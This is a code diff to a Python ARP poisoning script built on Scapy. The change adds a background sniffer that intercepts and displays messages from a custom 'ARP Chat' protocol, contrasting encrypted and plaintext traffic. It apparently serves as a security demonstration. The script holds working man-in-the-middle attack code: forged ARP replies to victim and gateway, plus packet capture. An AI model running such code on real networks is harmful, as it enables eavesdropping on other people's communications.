@@ -14,19 +14,21 @@ This script:
 1. Sends fake ARP replies to the victim saying "I am the gateway"
 2. Sends fake ARP replies to the gateway saying "I am the victim"
 3. Intercepts and forwards traffic between them (MITM)
+4. Displays intercepted ARP Chat messages (encrypted vs plaintext)
 """
 
 import sys
 import argparse
 import time
 import signal
+import threading
 from datetime import datetime
 
 sys.path.insert(0, '.')
 
 try:
     from scapy.all import (
-        Ether, ARP, sendp, send, srp, getmacbyip,
+        Ether, ARP, Raw, sendp, send, srp, getmacbyip,
         get_if_hwaddr, sniff, conf
     )
     SCAPY_AVAILABLE = True
@@ -40,13 +42,19 @@ from core.network_utils import get_interface_info, get_mac_address
 class ARPAttacker:
     """ARP Poisoning Attack for demo."""
     
-    def __init__(self, interface: str, victim_ip: str, target_ip: str):
+    ETHER_TYPE = 0x88b5  # ARP Chat EtherType
+    
+    def __init__(self, interface: str, victim_ip: str, target_ip: str, intercept: bool = True):
         self.interface = interface
         self.victim_ip = victim_ip
         self.target_ip = target_ip
         self.running = False
         self.packets_sent = 0
         self.packets_intercepted = 0
+        self.messages_intercepted = 0
+        self.encrypted_count = 0
+        self.plaintext_count = 0
+        self.intercept_enabled = intercept
         
         # Get our info
         info = get_interface_info(interface)
@@ -77,9 +85,47 @@ class ARPAttacker:
         print(f"  ")
         print(f"  Target IP:    {target_ip}")
         print(f"  Target MAC:   {self.target_mac}")
+        print(f"  ")
+        print(f"  Intercept:    {'🕵️ ENABLED' if intercept else 'DISABLED'}")
         print(f"{'='*60}")
         print(f"\n  ⚠️  WARNING: Only use on networks you own!")
         print(f"{'='*60}\n")
+        
+    def packet_handler(self, packet):
+        """Handle intercepted packets and display chat messages."""
+        if packet.haslayer(Ether) and packet[Ether].type == self.ETHER_TYPE:
+            if packet.haslayer(Raw):
+                try:
+                    data = packet[Raw].load.decode()
+                    self.messages_intercepted += 1
+                    timestamp = datetime.now().strftime("%H:%M:%S")
+                    
+                    # Check for encrypted messages
+                    if data.startswith("ARPCHAT_ENC|"):
+                        self.encrypted_count += 1
+                        parts = data.split("|", 2)
+                        if len(parts) >= 3:
+                            sender_ip = parts[1]
+                            encrypted_msg = parts[2]
+                            print(f"\n[{timestamp}] 🔒 ENCRYPTED MESSAGE INTERCEPTED:")
+                            print(f"    From: {sender_ip}")
+                            print(f"    Content: [ENCRYPTED - CANNOT READ]")
+                            print(f"    Raw: {encrypted_msg[:50]}...")
+                            print(f"    Status: 🛡️ PROTECTED - Encryption defeats interception!")
+                    
+                    # Check for plaintext messages
+                    elif data.startswith("ARPCHAT|"):
+                        self.plaintext_count += 1
+                        parts = data.split("|", 2)
+                        if len(parts) >= 3:
+                            sender_ip = parts[1]
+                            message = parts[2]
+                            print(f"\n[{timestamp}] 🚨 PLAINTEXT MESSAGE INTERCEPTED:")
+                            print(f"    From: {sender_ip}")
+                            print(f"    Content: {message}")
+                            print(f"    Status: ⚠️ VULNERABLE - Message exposed!")
+                except:
+                    pass
         
     def poison(self):
         """Send poisoned ARP packets to both victim and target."""
@@ -139,19 +185,47 @@ class ARPAttacker:
         self.running = True
         print("[*] Starting ARP poisoning attack...")
         print(f"[*] Sending poison packets every {interval} seconds")
+        if self.intercept_enabled:
+            print("[*] Sniffing for ARP Chat messages...")
         print("[*] Press Ctrl+C to stop and restore ARP tables\n")
+        
+        # Start sniffer thread if interception is enabled
+        if self.intercept_enabled:
+            sniffer_thread = threading.Thread(target=self._sniff_packets, daemon=True)
+            sniffer_thread.start()
         
         try:
             while self.running:
                 self.poison()
                 timestamp = datetime.now().strftime("%H:%M:%S")
-                print(f"[{timestamp}] Poison packets sent (Total: {self.packets_sent})")
+                status = f"Poisoned: {self.packets_sent}"
+                if self.intercept_enabled:
+                    status += f" | Intercepted: {self.messages_intercepted} (🔒{self.encrypted_count} / ⚠️{self.plaintext_count})"
+                print(f"[{timestamp}] {status}")
                 time.sleep(interval)
         except KeyboardInterrupt:
             self.running = False
             
         self.restore()
-        print(f"\n[*] Attack complete. Total packets sent: {self.packets_sent}")
+        print(f"\n[*] Attack complete.")
+        print(f"    Poison packets sent: {self.packets_sent}")
+        if self.intercept_enabled:
+            print(f"    Messages intercepted: {self.messages_intercepted}")
+            print(f"    - Encrypted (protected): {self.encrypted_count}")
+            print(f"    - Plaintext (exposed):   {self.plaintext_count}")
+    
+    def _sniff_packets(self):
+        """Background thread to sniff for ARP Chat packets."""
+        try:
+            sniff(
+                iface=self.interface,
+                prn=self.packet_handler,
+                filter=f"ether proto {hex(self.ETHER_TYPE)}",
+                store=False,
+                stop_filter=lambda _: not self.running
+            )
+        except:
+            pass
 
 
 def main():
@@ -160,9 +234,10 @@ def main():
     parser.add_argument("-v", "--victim", required=True, help="Victim IP address")
     parser.add_argument("-g", "--target", required=True, help="Target IP (gateway or other host)")
     parser.add_argument("--interval", type=float, default=2.0, help="Poison interval (seconds)")
+    parser.add_argument("--no-intercept", action="store_true", help="Disable chat interception")
     args = parser.parse_args()
     
-    attacker = ARPAttacker(args.interface, args.victim, args.target)
+    attacker = ARPAttacker(args.interface, args.victim, args.target, not args.no_intercept)
     attacker.start(args.interval)
 
 
